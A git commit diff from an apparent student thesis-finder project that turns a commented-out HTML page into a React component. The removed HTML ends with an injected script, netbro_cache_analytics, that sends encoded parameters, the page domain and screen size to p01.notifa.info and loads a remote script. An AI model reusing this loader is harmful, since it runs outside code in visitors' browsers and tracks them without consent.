ab9873143f2be78951051fd8252083a54c572ed0
rividya <ivy.aluna@gmail.com>
2020-05-29 15:59:25 +0700

    layout skripsi dan edit layout

--- src/Pages/skripsi.js
+++ src/Pages/skripsi.js
@@ -1,66 +1,58 @@
+import React, { useState } from 'react';
+import Fade from "react-reveal/Fade";
+import axios from 'axios';
+import qs from 'qs';
+import { MDBCol, MDBFormInline, MDBIcon, MDBRow } from "mdbreact";
+import 'bootstrap/dist/css/bootstrap.css';
 
-// var myvar = '<!DOCTYPE HTML>'+
-// '<html>'+
-// '    <head>'+
-// '        <meta charset = "utf-8">'+
-// '        <meta name="viewport" content="width=device-width, initial-scale=1.0">'+
-// '        <title>Skripsi</title>'+
-// '        <link type="text/css" rel="stylesheet" href="skripsi.css">'+
-// '        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">'+
-// '        <link rel="icon" href="skripsi1.png">'+
-// '    </head>'+
-// ''+
-// '    <body style="background-color: #1abc9c;">'+
-// '        <!-- Javascript -->'+
-// '        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>'+
-// '        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>'+
-// '        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>'+
-// ''+
-// '        <!-- Navbar -->'+
-// '        <nav class="navbar navbar-expand-lg navbar-light bg-light">'+
-// '            <a class="navbar-brand" href="homepage.html">Skripsi Finder</a>'+
-// '            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">'+
-// '            <span class="navbar-toggler-icon"></span>'+
-// '            </button>'+
-// '        '+
-// '            <div class="collapse navbar-collapse" id="navbarSupportedContent">'+
-// '            <ul class="navbar-nav mr-auto">'+
-// '                <li class="nav-item">'+
-// '                <a class="nav-link" href="homepage.html">Home </a>'+
-// '                </li>'+
-// '                <li class="nav-item">'+
-// '                <a class="nav-link" href="login.html">Login </a>'+
-// '                </li>'+
-// '            </ul>'+
-// '            </div>'+
-// '        </nav>'+
-// ''+
-// '        <!-- Container -->'+
-// '        <div class="container">'+
-// '            <div class="row">'+
-// '                <div class="col-md-4">'+
-// '                    <img src="formatskripsi.jpg" alt="Cover Skripsi">'+
-// '                </div>'+
-// '                    <div class="col-md-8">'+
-// '                        <div class="row">'+
-// '                            <p>'+
-// '                                Judul Skripsi'+
-// '                            </p>'+
-// '                        </div>'+
-// '                        <div class="row">'+
-// '                        <div class="col-md-5">Penulis</div>'+
-// '                        <div class="col-md-3">Bidang Minat</div>'+
-// '                        <div class="col-md-3">Tahun</div>'+
-// '                        </div>'+
-// '                        <article>'+
-// '                            Abstrak dari skripsi'+
-// '                        </article>'+
-// '                    </div>'+
-// '            </div>'+
-// '            <div class="btn-holder">'+
-// '                <button type="button">Download</button>'+
-// '              </div>'+
-// '        </div>'+
-// '    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXdMPn3Xt9flF0h1IRtdyyPjxbNZjFuY7INs9%2bDxnk7arxAYAZn4TosSUw5dXnWXs7XGLAQ8G%2bV0s6UgX2JpViJZF0DF0HkWAHxtaq4kkpu81QYI5gFxlibhdCytFAmDgBY8mJzNMV3xSn%2fLIrThv%2feFB6%2bnhA4SLc94GhXClJmP3W3PeMlHG6heICDGenL7ON1glezk0FrJJ%2b3%2bDpwnSe35JQGhOl200y2eYUlHPpzpzcZPzdTLUa3SBRawyYYAOyUDAGcPafRrWszPLgZdEIdji5fPqhpJ6dBwa5swcqHEsEsrFZamqCAKXL5yxg3MlgT2Hwyd9D%2bvSG2AJ7NAUDH97bD5aq58rY2drjyVBrSHSqbZTRRvN5hwLe8Tu047u%2byqjLW8%2bCwxB0dVuW%2fA9jJS1dpbpUH7vx99bbVamacWTLv%2bJB0wzSU5lgsaFWF6hnn1Hc0zyiFpfgP83Xb6jfcVisYpLg%2fNSOGn3Lavd%2f7HfBTSKnsJF9ZUvQV%2bcMga%2brUtkM2l5U1PeQoqCVLdcsWYN8SxBeFWPolL1wutXc3oAZDUu8lF5HGkWSuXLSIGGX" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>'+
-// '</html>';
-	
+export default function skripsi(){
+return (
+    <body>
+      {/* Navbar */}
+      <nav className="navbar navbar-expand-lg navbar-light bg-light">
+        <a className="navbar-brand" href="#">Skripsi Finder</a>
+        <button className="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+            <span className="navbar-toggler-icon"></span>
+        </button>
+
+        <div className="collapse navbar-collapse" id="navbarSupportedContent">
+            <ul className="navbar-nav mr-auto">
+                <li className="nav-item active">
+                    <a className="nav-link" href="homepage">Home</a>
+                </li>
+                <li className="nav-item">
+                    <a className="nav-link" href="login">Login</a>
+                </li>
+            </ul>
+        </div>
+      </nav>
+
+      {/* container */}
+      <div className="container">
+            <MDBRow>
+                <MDBCol md="4">
+                   <img className="imgSkripsi" src='./formatskripsi.jpg'></img>
+                </MDBCol>
+                <MDBCol md="8">
+                   <MDBRow>
+                       <p>
+                           Judul Skripsi
+                       </p>
+                   </MDBRow>
+                   <MDBRow>
+                   <MDBCol md="5">Penulis</MDBCol>
+                   <MDBCol md="3">Bidang Minat</MDBCol>
+                   <MDBCol md="3">Tahun</MDBCol>
+                   </MDBRow>
+                   <article>
+                     Abstrak dari skripsi
+                    </article>
+                </MDBCol>
+            </MDBRow>
+            <div className="btn-holder">
+                <button type="button">Download</button>
+            </div>
+        </div>
+    </body>
+    )
+}
